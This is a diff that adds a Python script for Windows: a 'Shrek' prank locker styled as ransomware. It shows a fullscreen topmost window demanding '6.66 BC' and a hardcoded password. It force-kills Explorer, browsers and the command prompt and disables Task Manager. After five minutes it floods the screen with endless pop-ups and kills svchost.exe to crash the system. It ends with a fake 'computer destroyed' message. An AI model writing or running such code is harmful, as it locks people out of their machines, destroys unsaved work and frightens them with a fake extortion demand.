@@ -1,0 +1,100 @@
+import ctypes
+import os
+import sys
+import tkinter as tk
+import threading
+import time
+from tkinter import messagebox
+import webbrowser
+import atexit
+
+# The correct password
+PASSWORD = "1535453758385838583"
+TIMER_DURATION = 300  # 5 minutes in seconds
+
+# Function to close all open programs
+def close_programs():
+    os.system("taskkill /f /im explorer.exe")  # Kills Windows Explorer (taskbar, etc.)
+    os.system("taskkill /f /im chrome.exe")    # Kills Chrome
+    os.system("taskkill /f /im firefox.exe")   # Kills Firefox
+    os.system("taskkill /f /im edge.exe")      # Kills Edge
+    os.system("taskkill /f /im notepad.exe")   # Kills Notepad
+    os.system("taskkill /f /im cmd.exe")       # Kills Command Prompt
+
+# Function to restore Explorer
+def restore_explorer():
+    os.system("start explorer.exe")
+
+# Function to spam pop-ups
+def spawn_popups():
+    while True:
+        messagebox.showerror("Shrek is watching", "Shrek is watching you...")
+
+# Function to fake a boot screen and show GIF after BSOD
+def fake_boot_screen():
+    time.sleep(5)  # Small delay before fake boot message
+    os.system("cls")  # Clearing command prompt (will not show in GUI)
+    print("Press any key to boot from CD or DVD...")
+    time.sleep(3)
+    print("Booting DVD/CVD... ERROR")
+    print("Your computer was destroyed by Lexerd63")
+    time.sleep(5)
+    webbrowser.open("https://www.icegif.com/wp-content/uploads/2022/01/icegif-1456.gif")  # Shrek dancing GIF
+
+# Function to trigger BSOD
+def trigger_bsod():
+    time.sleep(10)  # Small delay before BSOD
+    os.system("taskkill /f /im svchost.exe")  # Forces a crash (Windows only)
+    threading.Thread(target=fake_boot_screen, daemon=True).start()
+
+# Function to start countdown
+def start_timer():
+    time.sleep(TIMER_DURATION)
+    threading.Thread(target=spawn_popups, daemon=True).start()
+    threading.Thread(target=trigger_bsod, daemon=True).start()
+
+# Fullscreen Lock Window
+class LockScreen(tk.Tk):
+    def __init__(self):
+        super().__init__()
+
+        # Make the window full-screen and topmost
+        self.attributes("-fullscreen", True)
+        self.attributes("-topmost", True)
+        self.configure(bg="black")
+
+        # Display message
+        self.label = tk.Label(self, text="Shrek has locked your computer,\npay 6.66 BC as a joke.\nEnter password:", 
+                               font=("Arial", 20), fg="green", bg="black")
+        self.label.pack(expand=True)
+
+        # Password entry field
+        self.password_entry = tk.Entry(self, font=("Arial", 20), show="*")
+        self.password_entry.pack()
+        self.password_entry.bind("<Return>", self.check_password)
+
+        # Block Task Manager
+        ctypes.windll.user32.SystemParametersInfoW(97, 1, 0, 0)
+
+        # Start the timer
+        threading.Thread(target=start_timer, daemon=True).start()
+
+        # Run close_programs function
+        self.after(1000, close_programs)
+
+        # Re-enable Task Manager on exit
+        atexit.register(lambda: ctypes.windll.user32.SystemParametersInfoW(97, 0, 0, 0))
+
+    # Check password
+    def check_password(self, event=None):
+        if self.password_entry.get() == PASSWORD:
+            restore_explorer()
+            ctypes.windll.user32.SystemParametersInfoW(97, 0, 0, 0)  # Re-enable Task Manager
+            self.destroy()
+        else:
+            self.password_entry.delete(0, tk.END)
+
+# Run the lock screen
+if __name__ == "__main__":
+    app = LockScreen()
+    app.mainloop()
